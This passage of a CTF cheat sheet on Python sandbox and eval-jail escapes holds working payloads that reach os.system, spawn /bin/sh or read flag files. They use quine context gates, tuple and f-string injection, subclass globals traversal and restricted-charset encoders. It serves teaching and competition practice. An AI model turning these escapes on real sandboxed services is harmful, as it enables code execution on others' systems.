    <span class="pl-c1">0</span></pre></div>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Constraints Checklist for This Technique</h3><a id="user-content-constraints-checklist-for-this-technique" class="anchor" aria-label="Permalink: Constraints Checklist for This Technique" href="#constraints-checklist-for-this-technique"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" id="" disabled="" class="task-list-item-checkbox" aria-label="Completed task" checked=""> No <code>ast.Call</code> nodes (decorators are <code>ast.FunctionDef</code> with decorator_list)</li>
<li class="task-list-item"><input type="checkbox" id="" disabled="" class="task-list-item-checkbox" aria-label="Completed task" checked=""> No quotes (strings from <code>function.__name__</code>)</li>
<li class="task-list-item"><input type="checkbox" id="" disabled="" class="task-list-item-checkbox" aria-label="Completed task" checked=""> No <code>=</code> sign (decorators provide assignment)</li>
<li class="task-list-item"><input type="checkbox" id="" disabled="" class="task-list-item-checkbox" aria-label="Completed task" checked=""> No commas (single-argument decorator calls)</li>
<li class="task-list-item"><input type="checkbox" id="" disabled="" class="task-list-item-checkbox" aria-label="Completed task" checked=""> No <code>+</code>, <code>*</code>, operators (pure attribute/subscript chains)</li>
<li class="task-list-item"><input type="checkbox" id="" disabled="" class="task-list-item-checkbox" aria-label="Completed task" checked=""> Works with empty <code>__builtins__</code> (accesses real builtins via <code>__loader__</code>)</li>
</ul>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">When <strong>loader</strong> Is Not Available</h3><a id="user-content-when-loader-is-not-available" class="anchor" aria-label="Permalink: When loader Is Not Available" href="#when-loader-is-not-available"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">If <code>__loader__</code> isn't in scope but you have any function object <code>f</code>:</p>
<ul dir="auto">
<li><code>f.__class__</code> → function type</li>
<li><code>f.__globals__</code> → module globals where <code>f</code> was defined</li>
<li><code>f.__globals__["__builtins__"]</code> → real builtins (if <code>f</code> is from a normal module)</li>
</ul>
<p dir="auto">If you have a class <code>C</code>:</p>
<ul dir="auto">
<li><code>C.__init__.__globals__</code> → globals of the module defining <code>C</code></li>
</ul>
<p dir="auto"><strong>References:</strong> 0xL4ugh CTF 2025 "Ergastulum" (442pts, Elite), GCTF 2022 "Treebox"</p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Quine + Context Detection for Code Execution (BearCatCTF 2026)</h2><a id="user-content-quine--context-detection-for-code-execution-bearcatctf-2026" class="anchor" aria-label="Permalink: Quine + Context Detection for Code Execution (BearCatCTF 2026)" href="#quine--context-detection-for-code-execution-bearcatctf-2026"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Pattern (The Boy is Quine):</strong> Server asks for a quine (program that prints its own source code), validates it by running in a subprocess, then <code>exec()</code>s it in the main process with different globals.</p>
<p dir="auto"><strong>Exploit:</strong> Build a dual-purpose quine that:</p>
<ol dir="auto">
<li>Prints itself (passes quine validation in subprocess)</li>
<li>Executes payload only in the server process (detected via globals difference)</li>
</ol>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="# Context gate: &quot;subprocess&quot; module exists in server globals but not in subprocess
s='s=%r;print(s%%s,end=&quot;&quot;);__import__(&quot;os&quot;).system(&quot;cat /app/flag.txt&quot;)if&quot;subprocess&quot;in globals()else 0';print(s%s,end=&quot;&quot;);__import__(&quot;os&quot;).system(&quot;cat /app/flag.txt&quot;)if&quot;subprocess&quot;in globals()else 0"><pre><span class="pl-c"># Context gate: "subprocess" module exists in server globals but not in subprocess</span>
<span class="pl-s1">s</span><span class="pl-c1">=</span><span class="pl-s">'s=%r;print(s%%s,end="");__import__("os").system("cat /app/flag.txt")if"subprocess"in globals()else 0'</span>;<span class="pl-en">print</span>(<span class="pl-s1">s</span><span class="pl-c1">%</span><span class="pl-s1">s</span>,<span class="pl-s1">end</span><span class="pl-c1">=</span><span class="pl-s">""</span>);<span class="pl-en">__import__</span>(<span class="pl-s">"os"</span>).<span class="pl-c1">system</span>(<span class="pl-s">"cat /app/flag.txt"</span>)<span class="pl-k">if</span><span class="pl-s">"subprocess"</span><span class="pl-c1">in</span> <span class="pl-en">globals</span>()<span class="pl-k">else</span> <span class="pl-c1">0</span></pre></div>
<p dir="auto"><strong>Key insight:</strong> <code>exec()</code> in the server process inherits the server's globals (imported modules like <code>subprocess</code>), while the subprocess validation has a clean environment. Use <code>"module_name" in globals()</code> or <code>"module_name" in dir()</code> as a gate to distinguish contexts. The quine structure <code>s='s=%r;...';print(s%s,end="")</code> is the classic Python quine pattern.</p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Restricted Character Repunit Decomposition (BearCatCTF 2026)</h2><a id="user-content-restricted-character-repunit-decomposition-bearcatctf-2026" class="anchor" aria-label="Permalink: Restricted Character Repunit Decomposition (BearCatCTF 2026)" href="#restricted-character-repunit-decomposition-bearcatctf-2026"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Pattern (The Brig):</strong> Pick exactly 2 characters for your entire expression. Server evaluates <code>eval(long_to_bytes(eval(expr)))</code> — the outer eval runs the decoded Python code.</p>
<p dir="auto"><strong>Strategy:</strong> Choose <code>1</code> and <code>+</code>. Decompose the target integer into a sum of repunits (111, 1111, 11111, etc.):</p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="from Crypto.Util.number import bytes_to_long

target = bytes_to_long(b'eval(input())')  # → 13-byte integer

def repunit(k):
    return (10**k - 1) // 9  # 111...1 with k digits

terms = []
remaining = target
while remaining &gt; 0:
    k = 1
    while repunit(k + 1) &lt;= remaining:
        k += 1
    terms.append('1' * k)
    remaining -= repunit(k)

expr = '+'.join(terms)  # e.g., &quot;111...1+111...1+11+1+1&quot;
# len(expr) ≈ 2561 chars (fits 4096 limit)"><pre><span class="pl-k">from</span> <span class="pl-v">Crypto</span>.<span class="pl-v">Util</span>.<span class="pl-s1">number</span> <span class="pl-k">import</span> <span class="pl-s1">bytes_to_long</span>

<span class="pl-s1">target</span> <span class="pl-c1">=</span> <span class="pl-en">bytes_to_long</span>(<span class="pl-s">b'eval(input())'</span>)  <span class="pl-c"># → 13-byte integer</span>

<span class="pl-k">def</span> <span class="pl-en">repunit</span>(<span class="pl-s1">k</span>):
    <span class="pl-k">return</span> (<span class="pl-c1">10</span><span class="pl-c1">**</span><span class="pl-s1">k</span> <span class="pl-c1">-</span> <span class="pl-c1">1</span>) <span class="pl-c1">//</span> <span class="pl-c1">9</span>  <span class="pl-c"># 111...1 with k digits</span>

<span class="pl-s1">terms</span> <span class="pl-c1">=</span> []
<span class="pl-s1">remaining</span> <span class="pl-c1">=</span> <span class="pl-s1">target</span>
<span class="pl-k">while</span> <span class="pl-s1">remaining</span> <span class="pl-c1">&gt;</span> <span class="pl-c1">0</span>:
    <span class="pl-s1">k</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>
    <span class="pl-k">while</span> <span class="pl-en">repunit</span>(<span class="pl-s1">k</span> <span class="pl-c1">+</span> <span class="pl-c1">1</span>) <span class="pl-c1">&lt;=</span> <span class="pl-s1">remaining</span>:
        <span class="pl-s1">k</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>
    <span class="pl-s1">terms</span>.<span class="pl-c1">append</span>(<span class="pl-s">'1'</span> <span class="pl-c1">*</span> <span class="pl-s1">k</span>)
    <span class="pl-s1">remaining</span> <span class="pl-c1">-=</span> <span class="pl-en">repunit</span>(<span class="pl-s1">k</span>)

<span class="pl-s1">expr</span> <span class="pl-c1">=</span> <span class="pl-s">'+'</span>.<span class="pl-c1">join</span>(<span class="pl-s1">terms</span>)  <span class="pl-c"># e.g., "111...1+111...1+11+1+1"</span>
<span class="pl-c"># len(expr) ≈ 2561 chars (fits 4096 limit)</span></pre></div>
<p dir="auto"><strong>Key insight:</strong> Any positive integer can be written as a sum of repunits (numbers like 1, 11, 111, ...). The greedy algorithm produces ~O(log²(n)) terms. This converts a 2-character constraint into arbitrary code execution via <code>long_to_bytes()</code>. On the second unrestricted prompt, run <code>open('/flag.txt').read()</code>.</p>
<p dir="auto"><strong>Detection:</strong> Challenge restricts input character set to exactly 2 characters. Double-eval pattern (<code>eval(decode(eval(...)))</code>).</p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Python eval() Jail Escape via Tuple Injection (Codegate 2018)</h2><a id="user-content-python-eval-jail-escape-via-tuple-injection-codegate-2018" class="anchor" aria-label="Permalink: Python eval() Jail Escape via Tuple Injection (Codegate 2018)" href="#python-eval-jail-escape-via-tuple-injection-codegate-2018"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">When the server does <code>eval("your." + input + "()")</code>, inject a tuple to execute arbitrary code:</p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="# Server code: eval(&quot;your.&quot; + user_input + &quot;()&quot;)
# Inject: dig(),eval(eval('raw\x5finput()')),
# Becomes: eval(&quot;your.dig(),eval(eval('raw\x5finput()')),()&quot;) 
# = tuple of (your.dig(), eval(arbitrary), None)

# Alternative: inject payload via Name variable during registration
# Name = &quot;__import__('os').system('/bin/sh')&quot;
# Input: dig(),eval(name),exit
# eval(&quot;your.dig(),eval(name),exit()&quot;) -&gt; executes payload from name"><pre><span class="pl-c"># Server code: eval("your." + user_input + "()")</span>
<span class="pl-c"># Inject: dig(),eval(eval('raw\x5finput()')),</span>
<span class="pl-c"># Becomes: eval("your.dig(),eval(eval('raw\x5finput()')),()") </span>
<span class="pl-c"># = tuple of (your.dig(), eval(arbitrary), None)</span>

<span class="pl-c"># Alternative: inject payload via Name variable during registration</span>
<span class="pl-c"># Name = "__import__('os').system('/bin/sh')"</span>
<span class="pl-c"># Input: dig(),eval(name),exit</span>
<span class="pl-c"># eval("your.dig(),eval(name),exit()") -&gt; executes payload from name</span></pre></div>
<p dir="auto"><strong>Key insight:</strong> Python <code>eval()</code> on a comma-separated expression creates a tuple, allowing multiple expressions to execute. <code>\x5f</code> hex escapes bypass underscore blacklists. When direct code injection is blocked, store payload in a variable (registration name, environment) and reference it via <code>eval(varname)</code> in the eval context. The general pattern: if the server wraps your input in <code>eval("prefix" + input + "suffix")</code>, use commas to break out of the intended expression and inject additional expressions as tuple elements.</p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Python f-string Config Injection via Stored eval (INShAck 2018)</h2><a id="user-content-python-f-string-config-injection-via-stored-eval-inshack-2018" class="anchor" aria-label="Permalink: Python f-string Config Injection via Stored eval (INShAck 2018)" href="#python-f-string-config-injection-via-stored-eval-inshack-2018"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Pattern:</strong> A config creator uses Python f-strings to render values. Store a payload as one config value, then reference it from another using eval(). Register key "a" with value <code>__import__("os").system("cat flag")</code>, then key "eval(a)" with value "{}".</p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="# Step 1: Store payload as config value
register_key(&quot;a&quot;, '__import__(&quot;os&quot;).system(&quot;cat flag.txt&quot;)')

# Step 2: Create key whose name is eval(a) with empty format placeholder
register_key(&quot;eval(a)&quot;, &quot;{}&quot;)

# Step 3: When config renders f&quot;eval(a) = {value}&quot;,
# the f-string evaluates eval(a) in the key position,
# executing the stored payload
show_config()  # triggers f-string rendering -&gt; RCE"><pre><span class="pl-c"># Step 1: Store payload as config value</span>
<span class="pl-en">register_key</span>(<span class="pl-s">"a"</span>, <span class="pl-s">'__import__("os").system("cat flag.txt")'</span>)

<span class="pl-c"># Step 2: Create key whose name is eval(a) with empty format placeholder</span>
<span class="pl-en">register_key</span>(<span class="pl-s">"eval(a)"</span>, <span class="pl-s">"{}"</span>)

<span class="pl-c"># Step 3: When config renders f"eval(a) = {value}",</span>
<span class="pl-c"># the f-string evaluates eval(a) in the key position,</span>
<span class="pl-c"># executing the stored payload</span>
<span class="pl-en">show_config</span>()  <span class="pl-c"># triggers f-string rendering -&gt; RCE</span></pre></div>
<p dir="auto"><strong>Key insight:</strong> Python f-strings evaluate expressions in curly braces at render time. If config keys or values are rendered in f-strings, storing <code>eval(stored_key)</code> as a key name causes arbitrary code execution when the config is displayed. Two-step: store payload as value, reference via eval in key name.</p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Hints Cheat Sheet</h2><a id="user-content-hints-cheat-sheet" class="anchor" aria-label="Permalink: Hints Cheat Sheet" href="#hints-cheat-sheet"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>

<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">func_globals to Module Chain Traversal (PlaidCTF 2013)</h2><a id="user-content-func_globals-to-module-chain-traversal-plaidctf-2013" class="anchor" aria-label="Permalink: func_globals to Module Chain Traversal (PlaidCTF 2013)" href="#func_globals-to-module-chain-traversal-plaidctf-2013"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Pattern:</strong> Access <code>os.system</code> through the <code>func_globals</code> dictionary of a loaded class's method, without importing any modules.</p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="# Step 1: Find catch_warnings in subclass list (commonly index 49 or 59)
[x for x in ().__class__.__base__.__subclasses__()
    if x.__name__ == &quot;catch_warnings&quot;][0]

# Step 2: Access func_globals via __init__ or __repr__
g = ().__class__.__base__.__subclasses__()[59].__init__.func_globals
# Python 2: .__init__.im_func.func_globals
# Python 3: .__init__.__globals__

# Step 3: Traverse module chain: warnings → linecache → os
g[&quot;linecache&quot;].__dict__[&quot;os&quot;].system(&quot;cat /flag.txt&quot;)

# One-liner:
().__class__.__base__.__subclasses__()[59].__init__.__globals__[&quot;linecache&quot;].__dict__[&quot;os&quot;].system(&quot;id&quot;)"><pre><span class="pl-c"># Step 1: Find catch_warnings in subclass list (commonly index 49 or 59)</span>
[<span class="pl-s1">x</span> <span class="pl-k">for</span> <span class="pl-s1">x</span> <span class="pl-c1">in</span> ().<span class="pl-c1">__class__</span>.<span class="pl-c1">__base__</span>.<span class="pl-c1">__subclasses__</span>()
    <span class="pl-k">if</span> <span class="pl-s1">x</span>.<span class="pl-c1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"catch_warnings"</span>][<span class="pl-c1">0</span>]

<span class="pl-c"># Step 2: Access func_globals via __init__ or __repr__</span>
<span class="pl-s1">g</span> <span class="pl-c1">=</span> ().<span class="pl-c1">__class__</span>.<span class="pl-c1">__base__</span>.<span class="pl-c1">__subclasses__</span>()[<span class="pl-c1">59</span>].<span class="pl-c1">__init__</span>.<span class="pl-c1">func_globals</span>
<span class="pl-c"># Python 2: .__init__.im_func.func_globals</span>
<span class="pl-c"># Python 3: .__init__.__globals__</span>

<span class="pl-c"># Step 3: Traverse module chain: warnings → linecache → os</span>
<span class="pl-s1">g</span>[<span class="pl-s">"linecache"</span>].<span class="pl-c1">__dict__</span>[<span class="pl-s">"os"</span>].<span class="pl-c1">system</span>(<span class="pl-s">"cat /flag.txt"</span>)

<span class="pl-c"># One-liner:</span>
().<span class="pl-c1">__class__</span>.<span class="pl-c1">__base__</span>.<span class="pl-c1">__subclasses__</span>()[<span class="pl-c1">59</span>].<span class="pl-c1">__init__</span>.<span class="pl-c1">__globals__</span>[<span class="pl-s">"linecache"</span>].<span class="pl-c1">__dict__</span>[<span class="pl-s">"os"</span>].<span class="pl-c1">system</span>(<span class="pl-s">"id"</span>)</pre></div>
<p dir="auto"><strong>Key insight:</strong> The <code>warnings.catch_warnings</code> class is almost always loaded. Its <code>__init__.__globals__</code> contains a reference to <code>linecache</code>, which imports <code>os</code>. This chain avoids direct <code>import</code> statements. The subclass index varies by Python version — enumerate with <code>[(i,x.__name__) for i,x in enumerate(''.__class__.__mro__[1].__subclasses__())]</code>.</p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Restricted Charset Number Generation (PlaidCTF 2013)</h2><a id="user-content-restricted-charset-number-generation-plaidctf-2013" class="anchor" aria-label="Permalink: Restricted Charset Number Generation (PlaidCTF 2013)" href="#restricted-charset-number-generation-plaidctf-2013"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Pattern:</strong> Generate arbitrary integers using only <code>~</code> (bitwise NOT), <code>&lt;&lt;</code> (left shift), <code>[]&lt;[]</code> (False=0), and <code>{}&lt;[]</code> (True=1) when numeric literals are forbidden.</p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="def brainfuckize(nb):
    &quot;&quot;&quot;Convert integer to expression using only ~, &lt;&lt;, &lt;, [], {}&quot;&quot;&quot;
    if nb == -2: return &quot;~({}&lt;[])&quot;    # ~True = -2
    if nb == -1: return &quot;~([]&lt;[])&quot;    # ~False = -1
    if nb == 0:  return &quot;([]&lt;[])&quot;     # False = 0
    if nb == 1:  return &quot;({}&lt;[])&quot;     # True = 1
    if nb % 2:   return f&quot;~{brainfuckize(~nb)}&quot;  # Odd: ~(complement)
    return f&quot;({brainfuckize(nb//2)}&lt;&lt;({{}}&lt;[]))&quot;   # Even: half &lt;&lt; 1

# brainfuckize(65) → &quot;(~(~([]&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&quot;
# Then use: &quot;%c&quot; % 65 → &quot;A&quot;"><pre><span class="pl-k">def</span> <span class="pl-en">brainfuckize</span>(<span class="pl-s1">nb</span>):
    <span class="pl-s">"""Convert integer to expression using only ~, &lt;&lt;, &lt;, [], {}"""</span>
    <span class="pl-k">if</span> <span class="pl-s1">nb</span> <span class="pl-c1">==</span> <span class="pl-c1">-</span><span class="pl-c1">2</span>: <span class="pl-k">return</span> <span class="pl-s">"~({}&lt;[])"</span>    <span class="pl-c"># ~True = -2</span>
    <span class="pl-k">if</span> <span class="pl-s1">nb</span> <span class="pl-c1">==</span> <span class="pl-c1">-</span><span class="pl-c1">1</span>: <span class="pl-k">return</span> <span class="pl-s">"~([]&lt;[])"</span>    <span class="pl-c"># ~False = -1</span>
    <span class="pl-k">if</span> <span class="pl-s1">nb</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span>:  <span class="pl-k">return</span> <span class="pl-s">"([]&lt;[])"</span>     <span class="pl-c"># False = 0</span>
    <span class="pl-k">if</span> <span class="pl-s1">nb</span> <span class="pl-c1">==</span> <span class="pl-c1">1</span>:  <span class="pl-k">return</span> <span class="pl-s">"({}&lt;[])"</span>     <span class="pl-c"># True = 1</span>
    <span class="pl-k">if</span> <span class="pl-s1">nb</span> <span class="pl-c1">%</span> <span class="pl-c1">2</span>:   <span class="pl-k">return</span> <span class="pl-s">f"~<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">brainfuckize</span>(<span class="pl-c1">~</span><span class="pl-s1">nb</span>)<span class="pl-kos">}</span></span>"</span>  <span class="pl-c"># Odd: ~(complement)</span>
    <span class="pl-k">return</span> <span class="pl-s">f"(<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">brainfuckize</span>(<span class="pl-s1">nb</span><span class="pl-c1">//</span><span class="pl-c1">2</span>)<span class="pl-kos">}</span></span>&lt;&lt;({{}}&lt;[]))"</span>   <span class="pl-c"># Even: half &lt;&lt; 1</span>

<span class="pl-c"># brainfuckize(65) → "(~(~([]&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))"</span>
<span class="pl-c"># Then use: "%c" % 65 → "A"</span></pre></div>
<p dir="auto"><strong>Key insight:</strong> Combine with <code>"%c" % ascii_value</code> to build arbitrary strings character by character. This bypasses jails that strip all alphanumeric characters while allowing operators and brackets.</p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Python Name Mangling and Attribute Access (Tokyo Westerns 2017)</h2><a id="user-content-python-name-mangling-and-attribute-access-tokyo-westerns-2017" class="anchor" aria-label="Permalink: Python Name Mangling and Attribute Access (Tokyo Westerns 2017)" href="#python-name-mangling-and-attribute-access-tokyo-westerns-2017"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">Three sandbox escape vectors that exploit Python's name visibility model.</p>
